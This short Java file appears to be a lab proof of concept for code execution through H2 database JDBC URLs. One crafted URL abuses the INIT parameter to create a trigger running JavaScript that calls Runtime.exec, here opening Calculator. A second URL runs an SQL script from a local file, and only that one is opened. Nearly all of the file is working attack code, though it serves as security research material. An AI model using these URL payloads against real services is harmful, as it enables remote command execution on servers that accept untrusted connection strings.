package com.lab;

import java.sql.DriverManager;

public class Main {
	public static void main(String[] args) throws Exception {
		Class.forName("org.h2.Driver");
		String js_poc = "//javascript\njava.lang.Runtime.getRuntime().exec(\"open -a Calculator.app\")";
		String js_url        = "jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER hhhh BEFORE SELECT ON INFORMATION_SCHEMA.CATALOGS AS '" + js_poc + "'";

		String sql_poc_path = Main.class.getClassLoader().getResource("").getPath() + "poc.sql";
		String sql_url = "jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'file:///" + sql_poc_path + "'";

		DriverManager.getConnection(sql_url).close();
	}

}
